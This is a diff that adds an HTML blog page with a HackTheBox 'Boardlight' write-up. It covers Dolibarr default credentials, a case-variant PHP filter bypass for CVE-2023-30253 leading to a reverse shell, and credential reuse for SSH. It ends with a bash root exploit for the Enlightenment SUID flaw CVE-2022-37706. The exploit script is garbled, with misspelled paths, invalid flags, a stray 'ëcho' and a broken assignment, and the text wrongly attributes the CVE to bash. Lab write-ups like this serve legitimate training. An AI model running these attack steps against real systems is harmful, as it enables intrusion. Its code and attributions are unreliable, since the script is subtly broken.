@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Boardlight 035d30a2de5d4052ac9b1c549f5e87b1 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Boardlight 035d30a2de5d4052ac9b1c549f5e87b1" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Boardlight" />
+<meta property="og:description" content="Boardlight" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-12T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Boardlight 035d30a2de5d4052ac9b1c549f5e87b1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-12T16:05:57+00:00","datePublished":"2025-07-12T16:05:57+00:00","description":"Boardlight","headline":"Boardlight 035d30a2de5d4052ac9b1c549f5e87b1","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1.html"},"url":"https://your-site-url/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Boardlight 035d30a2de5d4052ac9b1c549f5e87b1</h1>
+  
+  <div class="post-date">
+    Published on 12 Jul 2025
+    
+  </div>
+  
+  <h1 id="boardlight">Boardlight</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>We start with nmap scanning, two ports open, one of them a web application</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled.png" alt="Untitled" /></p>
+
+<p>Let’s see what is this about, previously the dns recognition was unsuccessful, but thanks to the contact information we can see the domain</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_1.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_2.png" alt="Untitled" /></p>
+
+<p>So we proceed to find a subdomain using three different tools</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_3.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_4.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_5.png" alt="Untitled" /></p>
+
+<p>Dolibar sign-in as usually we need to discard obvious vulnerabilities as default credentials, and we bypass login interface</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_6.png" alt="Untitled" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>We’ve got the version of the software before, after searching on google we found there’s a vulnerability where someone with determine permissions can obtain RCE <strong>(CVE-2023-30253)</strong></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_7.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_8.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_9.png" alt="Untitled" /></p>
+
+<p>Go to create a new website</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_10.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_11.png" alt="Untitled" /></p>
+
+<p>The vulnerability consists in edit HTML source, apparently we can’t use php code because we don’t have those permissions but if we try to use variants like “Php, phP, pHp” this filter will be bypassed, using a normal reverse shell we could get a shell as <code class="language-plaintext highlighter-rouge">data</code></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_12.png" alt="Untitled" /></p>
+
+<p>Looking for config files where data has reading permissions we found credentials for the database</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_13.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_14.png" alt="Untitled" /></p>
+
+<p>If we try to break into the database, it would be useless because it has tons of tables, and users registered are admin:admin that we guess before</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_15.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_16.png" alt="Untitled" /></p>
+
+<p>Try to use those creds on ssh and got the user flag</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_17.png" alt="Untitled" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Using linpeas to enumerate the system we found a set uid binary in a path, casualty one of the directories of the path has almost the same of the machine it could be promising</p>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_18.png" alt="Untitled" /></p>
+
+<p>There is a vulnerability</p>
+
+<p>CVE-2022-37706 in bash, basically the system library function mishandles path names that begin with /dev/.. substring</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="c">#This code is trying to search a specific vulnerable SUID </span>
+<span class="c">#if if find it, it try to leverage it to obtain full access</span>
+
+<span class="nb">echo</span> <span class="s2">"CVE-2022-37706"</span>
+<span class="nb">echo</span> <span class="s2">"[*]Trying to find the file of the vulnerable SUID"</span>
+
+<span class="c">#It search through the whole file system with string "enlightenment_sys"</span>
+<span class="c">#which has the following permises: SUID (-4000).</span>
+<span class="c">#Redirects all errors to /dev/null</span>
+
+file <span class="o">=</span><span class="si">$(</span>find / <span class="nt">-name</span> enlightment_sys <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">head</span> <span class="nt">-1</span><span class="si">)</span>
+
+<span class="k">if</span><span class="o">[[</span> <span class="nt">-z</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span> <span class="o">]]</span>
+<span class="k">then 
+	</span><span class="nb">echo</span> <span class="s2">"[- Couldn't find the vulnerable SUID file...]"</span>
+	<span class="nb">echo</span> <span class="s2">"[*] Enlightment should be installed on your system"</span>
+	<span class="nb">exit </span>1
+	
+<span class="k">fi
+
+</span><span class="nb">echo</span> <span class="s2">"[+] Vulnerable SUID binery found!!"</span>
+<span class="nb">echo</span> <span class="s2">"[+] Trying to pop up a root shell"</span>
+
+<span class="c">#It creates necessary directories to the exploit </span>
+<span class="nb">mkdir</span> <span class="nt">-b</span> /tmp/net
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"/dev/../tmp/;/tmp/exploit"</span>
+
+<span class="nb">echo</span> <span class="s2">"/bin/sh"</span> <span class="o">&gt;</span> /tmp/exploit
+<span class="nb">chmod </span>a+x /tmp/exploit 
+
+ëcho <span class="s2">"[+] Welcome to the rabbit holee!!"</span>
+
+<span class="k">${</span><span class="nv">file</span><span class="k">}</span> /bin/mount <span class="nt">-o</span> <span class="se">\n</span>oexec,nosuid,utf8,nodev,iocharset<span class="o">=</span>utf8,utf8<span class="o">=</span>0,utf8<span class="o">=</span>1,iud<span class="o">=(</span><span class="nb">id</span> <span class="nt">-u</span><span class="o">)</span>,<span class="se">\"</span>/dev/../tmp/<span class="p">;</span>/tmp/expoit<span class="s2">" /tmp///net
+
+read -p "</span>press any key to clean<span class="s2">"
+
+sleep 5 
+rm -rf /tmp/exploit
+rm -rf /tmp/net
+
+echo -e "</span>Done<span class="s2">"
+
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1_Untitled_19.png" alt="Untitled" /></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1.html';
+     this.page.identifier = '/writeups/2025/07/12/f227c51a-c8ce-4be0-8d7b-148003591331-export-12cef38b-bf81-4c54-bfe4-89d0dcef79f1';
+     this.page.title = 'Boardlight 035d30a2de5d4052ac9b1c549f5e87b1';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
